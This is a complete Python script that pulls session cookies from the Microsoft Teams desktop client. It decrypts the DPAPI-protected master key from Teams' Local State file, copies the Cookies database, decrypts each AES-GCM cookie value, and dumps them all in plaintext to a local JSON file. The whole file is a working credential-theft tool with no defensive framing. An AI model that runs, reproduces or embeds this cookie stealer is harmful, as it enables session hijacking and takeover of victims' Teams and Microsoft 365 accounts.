import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
import win32crypt


def decrypt_with_aes_gcm(encrypted_value, key):
    nonce = encrypted_value[3:15]
    ciphertext = encrypted_value[15:-16]
    tag = encrypted_value[-16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)


def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Microsoft\Teams\Local State', "r",
              encoding='utf-8') as f:
        local_state = f.read()
    local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]


def create_cookie_object(host, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires,
                         is_persistent, priority, samesite, source_scheme, source_port, is_same_party):
    return {
        "domain": host,
        "name": name,
        "value": value,
        "path": path,
        "expires": expires_utc,
        "httpOnly": is_httponly,
        "secure": is_secure,
        "lastAccess": last_access_utc,
        "hasExpires": has_expires,
        "isPersistent": is_persistent,
        "priority": priority,
        "sameSite": samesite,
        "sourceScheme": source_scheme,
        "sourcePort": source_port,
        "sameParty": is_same_party
    }


def get_cookies():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Microsoft\Teams\Network\Cookies'
    shutil.copy2(login_db, "teams.db")
    conn = sqlite3.connect("teams.db")
    cursor = conn.cursor()

    cookies_for_export = []
    processed_cookies = set()

    try:
        cursor.execute(
            'SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, is_same_party FROM cookies')
        for r in cursor.fetchall():
            host, name, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, is_same_party = r

            cookie_identifier = f"{host}_{name}"
            if cookie_identifier in processed_cookies:
                continue
            processed_cookies.add(cookie_identifier)

            if encrypted_value[:3] == b'v10':
                decrypted_value = decrypt_with_aes_gcm(encrypted_value, master_key).decode('utf-8')

                cookie_obj = create_cookie_object(host, name, decrypted_value, path, expires_utc, is_secure,
                                                  is_httponly, last_access_utc, has_expires, is_persistent, priority,
                                                  samesite, source_scheme, source_port, is_same_party)
                cookies_for_export.append(cookie_obj)

        with open("teams_cookies_output.json", "w") as outfile:
            json.dump(cookies_for_export, outfile, indent=4)

    except Exception as e:
        print(f"Error: {str(e)}")

    cursor.close()
    conn.close()
    os.remove("teams.db")


if __name__ == '__main__':
    get_cookies()
